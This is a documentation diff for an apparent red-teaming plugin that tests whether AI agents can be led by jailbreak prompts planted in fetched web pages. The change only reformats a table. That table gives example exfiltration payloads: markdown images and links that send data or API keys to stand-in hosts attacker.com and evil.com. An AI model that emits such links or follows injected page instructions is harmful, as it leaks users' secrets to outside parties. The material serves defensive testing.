@@ -60,6 +60,7 @@ redteam:
 ```
 
 This flow:
+
 1. `jailbreak:meta` generates sophisticated attack prompts
 2. `indirect-web-pwn` embeds each attack in a realistic web page with tracking URLs
 3. The agent is prompted to fetch and analyze the page
@@ -98,11 +99,11 @@ A test fails if the agent:
 
 The plugin tests for common exfiltration techniques:
 
-| Pattern | Description |
-|---------|-------------|
-| **Image markdown injection** | `![](https://attacker.com/collect?data=SENSITIVE_DATA)` |
-| **Link injection** | `[Click here](https://evil.com/?secret=API_KEY)` |
-| **URL-based encoding** | Query parameters, path segments, or fragments containing extracted data |
+| Pattern                      | Description                                                             |
+| ---------------------------- | ----------------------------------------------------------------------- |
+| **Image markdown injection** | `![](https://attacker.com/collect?data=SENSITIVE_DATA)`                 |
+| **Link injection**           | `[Click here](https://evil.com/?secret=API_KEY)`                        |
+| **URL-based encoding**       | Query parameters, path segments, or fragments containing extracted data |
 
 ## Remediation
 
